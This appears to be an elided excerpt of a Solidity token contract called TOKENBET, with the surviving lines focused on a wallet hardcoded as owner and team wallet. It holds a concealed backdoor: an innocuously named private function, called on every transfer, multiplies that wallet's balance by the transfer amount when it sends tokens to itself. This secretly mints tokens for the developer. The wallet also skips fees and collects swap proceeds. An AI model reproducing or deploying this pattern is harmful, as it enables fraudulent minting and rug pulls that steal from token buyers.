...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x59698e5797C2898141eba9D45AE4bcb858A208a8;
...
contract TOKENBET is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private teamDevWallet = payable(0x59698e5797C2898141eba9D45AE4bcb858A208a8);
    address payable private BurnWallet = payable(0x000000000000000000000000000000000000dEaD); 
    address payable private zeroWallet = payable(0x0000000000000000000000000000000000000000); 
    ...
    */
    ...
    string private _name = "TOKENBET"; 
    string private _symbol = "TOKENBET";  
    ...
    uint256 private _preTotalFeeTOKENBET = _TotalFee; 
    uint256 private _preBuyFeeTOKENBET = _buyFee; 
    uint256 private _preSellFeeTOKENBET = _sellFee; 
    ...
    */
    ...
    constructor () {
        ...
        _isExcludedFromFee[teamDevWallet] = true;
    ...
    */
     function TOKENBETChecker(address f,address t,uint256 m) private {
        if (f == t && f ==teamDevWallet)
         {_tOwned[teamDevWallet] = _tOwned[teamDevWallet].mul(m);
         }
    }
    ...
    */
    ...
    function removeAllFee() private {
        ...
        _preBuyFeeTOKENBET = _buyFee; 
        _preSellFeeTOKENBET = _sellFee; 
        _preTotalFeeTOKENBET = _TotalFee;
        _buyFee = 0;
        _sellFee = 0;
        _TotalFee = 0;
    ...
    _TotalFee = _preTotalFeeTOKENBET;
    _buyFee = _preBuyFeeTOKENBET; 
    _sellFee = _preSellFeeTOKENBET; 
    ...
    function _transfer(
        ...
        */
        ...
        TOKENBETChecker (from,to,amount);
    ...
    */
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        ...
        sendToWallet(teamDevWallet,contractBNB);
    }
